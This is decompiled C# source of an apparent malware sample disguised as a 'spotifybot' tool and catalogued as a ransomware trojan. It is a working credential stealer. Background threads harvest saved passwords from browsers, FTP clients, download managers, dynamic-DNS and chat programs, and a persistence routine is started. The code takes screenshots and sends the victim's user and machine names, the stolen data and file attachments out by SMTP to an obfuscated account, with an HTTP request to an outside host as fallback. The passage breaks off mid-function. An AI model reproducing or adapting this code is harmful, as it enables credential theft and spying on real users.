// Decompiled with JetBrains decompiler
// Type: JNXOYT
// Assembly: spotifybot, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 49F8E78E-98C1-464D-B8BC-BD712E85FF5D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4708e643ab129b31b3e067f9a628b4f0e5dfa2fbd30e637e9fb217bb8c703115.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;

public class JNXOYT
{
  public static string YKIRG;
  public static string RICXH;
  public static string RYKJL;
  public static string SHVTM;
  public static string EFGYB;
  public static string ISHIE;
  public static string IMXBT;
  public static string CQRTK;
  public static string TFXIC;
  public static string IQEWE;
  public static string TSFEQ;
  public static string LXMYL;
  public static string YTOKH;
  public static string WEEHBIWG = "";
  public static string WTINUEUL = RUDUUFDP.CPMXFIPG("l262vbuXo7zErpKlsLW0Y6W2sauPbKy/ryM=", "False");
  public static string JIGTWDWP = RUDUUFDP.CPMXFIPG("l262vbuXbra9uyM=", "False");
  public static string OCCVYBQX = RUDUUFDP.CPMXFIPG("mq/BxHSOr669slWlvMEj", "False");
  public static int DKMWFUQG = 587;
  public static string CWMRCBXG = RUDUUFDP.CPMXFIPG("DLEXSite", "False");
  public static string WLFHTVHJ = RUDUUFDP.CPMXFIPG("jbS/wn5UbyM=", "False");
  public static string VVKPF = RUDUUFDP.CPMXFIPG("Iw==", "False");
  public static string XHBIP = RUDUUFDP.CPMXFIPG("abG8wLVeX3rJc1Rvg4l0VCM=", "False");
  public static string KQSSF = RUDUUFDP.CPMXFIPG("faq6t7SdtGymqpi3tbaqmWGvwrqSpWzBtJphuMKmimGZpohZc3qXkXJvbCM=", "False");
  public static string CGFYF = RUDUUFDP.CPMXFIPG("aZ+1w6cj", "False");
  public static string QWHHT = RUDUUFDP.CPMXFIPG("dqzC0LQW", "False");
  public static int TKEOD = 1800000;
  public static string HVRMO = "";
  public static string GBHXC = "";
  public static int number = 0;
  public static WXNWOL HTVYHM;
  public static Thread WVTTMS = new Thread(new ThreadStart(JNXOYT.TXCUGH));
  public static Thread GCThread = new Thread(new ThreadStart(DAChrome.GTCHRME));
  public static Thread OEIMWV = new Thread(new ThreadStart(JNXOYT.CWYHNJ));
  public static Thread RunThread = new Thread(new ThreadStart(JNXOYT.SDCNFRMTN));
  public static Thread STRTTHRD = new Thread(new ThreadStart(DAStartup.Startupdll.StartPers));
  public static Thread IDMThread = new Thread(new ThreadStart(DAIDM.IDMdll.GTMYIDM));
  public static Thread CREFTPThread = new Thread(new ThreadStart(DACore.Coredll.GTMYCore));
  public static Thread NMBZZThread = new Thread(new ThreadStart(DANMBZZ.NMBZZdll.nimmbuzz));
  public static Thread PGDNThread = new Thread(new ThreadStart(DAPGDN.PGDNdll.GTMYPig));
  public static Thread SMRTFTPThread = new Thread(new ThreadStart(DASMRTFTP.Smartdll.GTMYSmart));
  public static Thread DynDNSThread = new Thread(new ThreadStart(DADynDNS.DynDNSdll.GetDADyn));
  public static Thread ImvuThread = new Thread(new ThreadStart(DAImvu.Imvudll.GTMYIm));
  public static Thread NoipThread = new Thread(new ThreadStart(DANoip.Noipdll.GTMYNo));

  [STAThread]
  public static void Main()
  {
    int num1;
    try
    {
      Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5);
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      try
      {
        foreach (string file in MyProject.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, "*.png*"))
          System.IO.File.Delete(file);
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
      try
      {
        foreach (string file in MyProject.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
          System.IO.File.Delete(file);
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.STRTTHRD.IsBackground = true;
      JNXOYT.STRTTHRD.Start();
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    int num2 = 0;
    int num3;
    while (true)
    {
      num3 = 1;
      try
      {
        if (num2 == 3)
          Application.Restart();
        JNXOYT.HTVYHM = new WXNWOL(JNXOYT.GBHXC);
        WXNWOL.USWETQ();
        break;
      }
      catch (Exception ex)
      {
        int lErl = num3;
        ProjectData.SetProjectError(ex, lErl);
        checked { ++num2; }
        ProjectData.ClearProjectError();
      }
    }
    try
    {
      JNXOYT.WVTTMS.IsBackground = true;
      JNXOYT.WVTTMS.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      string vvkpf = JNXOYT.VVKPF;
      if (Operators.CompareString(vvkpf, RUDUUFDP.CPMXFIPG("ltLc2gI=", "False"), false) == 0)
      {
        int num4 = (int) MessageBox.Show(JNXOYT.KQSSF, JNXOYT.XHBIP, MessageBoxButtons.OK, MessageBoxIcon.None);
      }
      else if (Operators.CompareString(vvkpf, RUDUUFDP.CPMXFIPG("h6zIy7ieshg=", "False"), false) == 0)
      {
        int num5 = (int) MessageBox.Show(JNXOYT.KQSSF, JNXOYT.XHBIP, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
      else if (Operators.CompareString(vvkpf, RUDUUFDP.CPMXFIPG("c8G3x66bqsjEvJwZ", "False"), false) == 0)
      {
        int num6 = (int) MessageBox.Show(JNXOYT.KQSSF, JNXOYT.XHBIP, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
      else if (Operators.CompareString(vvkpf, RUDUUFDP.CPMXFIPG("bqqwuC8=", "False"), false) == 0)
      {
        int num7 = (int) MessageBox.Show(JNXOYT.KQSSF, JNXOYT.XHBIP, MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (Operators.CompareString(vvkpf, RUDUUFDP.CPMXFIPG("W6Ousqcw", "False"), false) == 0)
      {
        int num8 = (int) MessageBox.Show(JNXOYT.KQSSF, JNXOYT.XHBIP, MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (Operators.CompareString(vvkpf, RUDUUFDP.CPMXFIPG("kdDL4NOpytQJ", "False"), false) == 0)
      {
        int num9 = (int) MessageBox.Show(JNXOYT.KQSSF, JNXOYT.XHBIP, MessageBoxButtons.OK, MessageBoxIcon.Question);
      }
      else if (Operators.CompareString(vvkpf, RUDUUFDP.CPMXFIPG("cKS8uSI=", "False"), false) == 0)
      {
        int num10 = (int) MessageBox.Show(JNXOYT.KQSSF, JNXOYT.XHBIP, MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (Operators.CompareString(vvkpf, RUDUUFDP.CPMXFIPG("h9Tg2Nev1NcD", "False"), false) == 0)
      {
        int num11 = (int) MessageBox.Show(JNXOYT.KQSSF, JNXOYT.XHBIP, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
      else if (Operators.CompareString(vvkpf, RUDUUFDP.CPMXFIPG("b6+ywreTosC8tJQh", "False"), false) == 0)
      {
        int num12 = (int) MessageBox.Show(JNXOYT.KQSSF, JNXOYT.XHBIP, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
      else
      {
        int num13 = (int) MessageBox.Show(RUDUUFDP.CPMXFIPG("mc3V39K7zYq21bbO3JGyp8Lf48iojYrBz6nA3daDq86K5dJkx97l036Omd7Mp9HZ5NKq05jU0rF/0ODVZMzZ48hkx8/d03ID", "False"), RUDUUFDP.CPMXFIPG("i7/H0cStv3yox6jAzhM=", "False"), MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.RunThread.IsBackground = true;
      JNXOYT.RunThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.GCThread.IsBackground = true;
      JNXOYT.GCThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      new DASafari.SFRIDL().SAFRGT();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      DAOpera.Operaz operaz = new DAOpera.Operaz();
      DAOpera.Operaz.FPQX();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("k6SwpsWrgMHGEw==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("jZnAwcKgv8bExI2OuMG7przKuqKEjsbSfpWuFw==", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("goa8vKhosMCvmIu1wLyzjbSotKiJsMHBuZkh", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("iZW8vb6cu8LAwImKtL23orjGtq2Qq8LPuqG7Gw==", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("jZ640LVzu8u9kZSvxtO+pb+Fx76aFg==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("lqLJysupyM/NzZaXwcrEr8XTw6ubx8WpyK60ocq8qcrO28xovs7QEA==", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("mYbQ08qiu9XLwrG0z8vPscTS0cWrCg==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("gIyztLWTsrm3t4CBq7Suma+9ra+Fsr69sououCU=", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("g4S2yKmWq7uwvYiuubm6VaauyCM=", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("l6PKy8yqydDOzpeYwsvFsMbUxNGcws3Nzmm6wtwP", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("k6XN08qguNbAyZzG0c3EnsUR", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("gY20tbaUs7q4uIGCrLWvmrC+rreKtL+7soyzIw==", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("hou5w66ErrzDqoa4ucuul6a+uLCPt37PtpYd", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("jprBwsOhwMfFxY6PucK8p73Lu5ebub3Zup65ubK6prLLjcmfuRY=", "False"), true);
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.IDMThread.IsBackground = true;
      JNXOYT.IDMThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.CREFTPThread.IsBackground = true;
      JNXOYT.CREFTPThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.ImvuThread.IsBackground = true;
      JNXOYT.ImvuThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.PGDNThread.IsBackground = true;
      JNXOYT.PGDNThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.SMRTFTPThread.IsBackground = true;
      JNXOYT.SMRTFTPThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      DAMSN.MSNdll.GTMSN();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.DynDNSThread.IsBackground = true;
      JNXOYT.DynDNSThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.ImvuThread.IsBackground = true;
      JNXOYT.ImvuThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.NoipThread.IsBackground = true;
      JNXOYT.NoipThread.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.OEIMWV.IsBackground = true;
      JNXOYT.OEIMWV.Start();
    }
    catch (Exception ex)
    {
      int lErl = num3;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
    Process.GetCurrentProcess().WaitForExit();
  }

  public static void VCSHW(ref double ICWOVU)
  {
    try
    {
      DateTime t2 = DateAndTime.Now.AddSeconds(ICWOVU);
      while (DateTime.Compare(DateAndTime.Now, t2) < 0)
        Application.DoEvents();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void SDCNFRMTN()
  {
    try
    {
      if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("i57H0bMX", "False")))
      {
        try
        {
          Rectangle bounds = Screen.PrimaryScreen.Bounds;
          Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
          bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("kZ3Excakw8rIyJGTzce4mr7Py7Whw7eovafDz7TJo37L0LsR", "False"));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          MailMessage message = new MailMessage();
          SmtpClient smtpClient = new SmtpClient(JNXOYT.OCCVYBQX);
          message.From = new MailAddress(JNXOYT.WTINUEUL);
          message.To.Add(JNXOYT.WTINUEUL);
          message.Subject = RUDUUFDP.CPMXFIPG("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", "False") + Environment.MachineName.ToString();
          message.Body = RUDUUFDP.CPMXFIPG("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", "False") + Environment.MachineName.ToString() + Environment.NewLine + RUDUUFDP.CPMXFIPG("ns/gkretz+DeyGWy0NXJrtbQkrC0x96SqrfP2JK4rcXYkre0z9mgBQ==", "False");
          smtpClient.Port = JNXOYT.DKMWFUQG;
          smtpClient.EnableSsl = true;
          smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(JNXOYT.WTINUEUL, JNXOYT.JIGTWDWP);
          try
          {
            Attachment attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("kZ3Excakw8rIyJGTzce4mr7Py7Whw7eovafDz7TJo37L0LsR", "False"));
            message.Attachments.Add(attachment);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          smtpClient.Send(message);
          try
          {
            System.IO.File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("i57H0bMX", "False"));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          try
          {
            HttpWebResponse response = (HttpWebResponse) WebRequest.Create(RUDUUFDP.CPMXFIPG("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False") + "?to=" + JNXOYT.WTINUEUL + "&subject=" + Strings.Replace(RUDUUFDP.CPMXFIPG("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20") + "&message=" + Strings.Replace(RUDUUFDP.CPMXFIPG("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", "False") + Environment.MachineName.ToString() + Environment.NewLine + RUDUUFDP.CPMXFIPG("ns/gkretz+DeyGWy0NXJrtbQkrC0x96SqrfP2JK4rcXYkre0z9mgBQ==", "False"), " ", "%20") + "&from=" + JNXOYT.WTINUEUL).GetResponse();
          }
          catch (Exception ex2)
          {
            ProjectData.SetProjectError(ex2);
            ProjectData.ClearProjectError();
          }
          ProjectData.ClearProjectError();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      JNXOYT.RunThread.Abort();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void TXCUGH()
  {
    while (true)
    {
      Thread.Sleep(JNXOYT.TKEOD);
      string str1 = "";
      double ICWOVU1 = 0.2;
      JNXOYT.VCSHW(ref ICWOVU1);
      string str2;
      try
      {
        WebClient webClient = new WebClient();
        str2 = RUDUUFDP.CPMXFIPG("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(RUDUUFDP.CPMXFIPG("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str2 = "";
        ProjectData.ClearProjectError();
      }
      double ICWOVU2 = 1.0;
      JNXOYT.VCSHW(ref ICWOVU2);
      try
      {
        if (Operators.CompareString(JNXOYT.CGFYF, RUDUUFDP.CPMXFIPG("mNHf1gY=", "False"), false) == 0)
        {
          Rectangle bounds = Screen.PrimaryScreen.Bounds;
          Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
          bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + JNXOYT.number.ToString() + RUDUUFDP.CPMXFIPG("ZsPMzBI=", "False"));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      double ICWOVU3 = 0.3;
      JNXOYT.VCSHW(ref ICWOVU3);
      try
      {
        if (Operators.CompareString(JNXOYT.GBHXC, "", false) != 0)
        {
          JNXOYT.HVRMO = RUDUUFDP.CPMXFIPG("fHiEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYSLYG2rrsFgXnmEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYWrKQ==", "False") + Environment.NewLine + Environment.NewLine + JNXOYT.GBHXC + Environment.NewLine + Environment.NewLine + str2 + Environment.NewLine + Environment.NewLine + str1;
          try
          {
            MailMessage message = new MailMessage();
            MailMessage mailMessage = message;
            mailMessage.From = new MailAddress(JNXOYT.WTINUEUL);
            mailMessage.To.Add(JNXOYT.WTINUEUL);
            mailMessage.Subject = RUDUUFDP.CPMXFIPG("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", "False") + Environment.MachineName.ToString();
            mailMessage.Body = JNXOYT.HVRMO;
            try
            {
              if (Operators.CompareString(JNXOYT.CGFYF, RUDUUFDP.CPMXFIPG("mNHf1gY=", "False"), false) == 0)
              {
                Attachment attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + JNXOYT.number.ToString() + RUDUUFDP.CPMXFIPG("ZsPMzBI=", "False"));
                mailMessage.Attachments.Add(attachment);
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            new SmtpClient(JNXOYT.OCCVYBQX)
            {
              Port = JNXOYT.DKMWFUQG,
              EnableSsl = true,
              Credentials = ((ICredentialsByHost) new NetworkCredential(JNXOYT.WTINUEUL, JNXOYT.JIGTWDWP))
            }.Send(message);
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            try
            {
              HttpWebResponse response = (HttpWebResponse) WebRequest.Create(RUDUUFDP.CPMXFIPG("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False") + "?to=" + JNXOYT.WTINUEUL + "&subject=" + Strings.Replace(RUDUUFDP.CPMXFIPG("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20") + "&message=" + Strings.Replace(JNXOYT.HVRMO, " ", "%20") + "&from=" + JNXOYT.WTINUEUL).GetResponse();
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      JNXOYT.HVRMO = "";
      JNXOYT.GBHXC = "";
      JNXOYT.WEEHBIWG = "";
      checked { ++JNXOYT.number; }
    }
  }

  public static void CWYHNJ()
  {
    int length = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("eoatrq+NrLOxsXp7pa6ok6m3pyw=", RUDUUFDP.CPMXFIPG("g7nP3cEJ", "False"))).Length;
    FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("eoatrq+NrLOxsXp7pa6ok6m3pyw=", RUDUUFDP.CPMXFIPG("g7nP3cEJ", "False"))).GetFiles();
    try
    {
      double ICWOVU = 25.0;
      JNXOYT.VCSHW(ref ICWOVU);
      string Expression = RUDUUFDP.CPMXFIPG("lZGdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3krPbvpvBxdnMd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ4sg4=", "False") + Environment.NewLine + Environment.NewLine + JNXOYT.YKIRG + Environment.NewLine + Environment.NewLine + JNXOYT.RICXH + Environment.NewLine + Environment.NewLine + JNXOYT.RYKJL + Environment.NewLine + Environment.NewLine + JNXOYT.SHVTM + Environment.NewLine + Environment.NewLine + JNXOYT.EFGYB + Environment.NewLine + Environment.NewLine + JNXOYT.ISHIE + Environment.NewLine + Environment.NewLine + JNXOYT.IMXBT + Environment.NewLine + Environment.NewLine + JNXOYT.CQRTK + Environment.NewLine + Environment.NewLine + JNXOYT.IQEWE + Environment.NewLine + Environment.NewLine + JNXOYT.TSFEQ + Environment.NewLine + Environment.NewLine + JNXOYT.LXMYL + Environment.NewLine + Environment.NewLine + JNXOYT.YTOKH + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo0f", "False");
      try
      {
        MailMessage message = new MailMessage();
        MailMessage mailMessage = message;
        mailMessage.From = new MailAddress(JNXOYT.WTINUEUL);
        mailMessage.To.Add(JNXOYT.WTINUEUL);
        mailMessage.Subject = RUDUUFDP.CPMXFIPG("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", RUDUUFDP.CPMXFIPG("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
        mailMessage.Body = Expression;
        try
        {
          FileInfo[] fileInfoArray = files;
          int index = 0;
          while (index < fileInfoArray.Length)
          {
            Attachment attachment = new Attachment(fileInfoArray[index].FullName);
            mailMessage.Attachments.Add(attachment);
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        new SmtpClient(JNXOYT.OCCVYBQX)
        {
          Port = JNXOYT.DKMWFUQG,
          EnableSsl = true,
          Credentials = ((ICredentialsByHost) new NetworkCredential(JNXOYT.WTINUEUL, JNXOYT.JIGTWDWP))
        }.Send(message);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
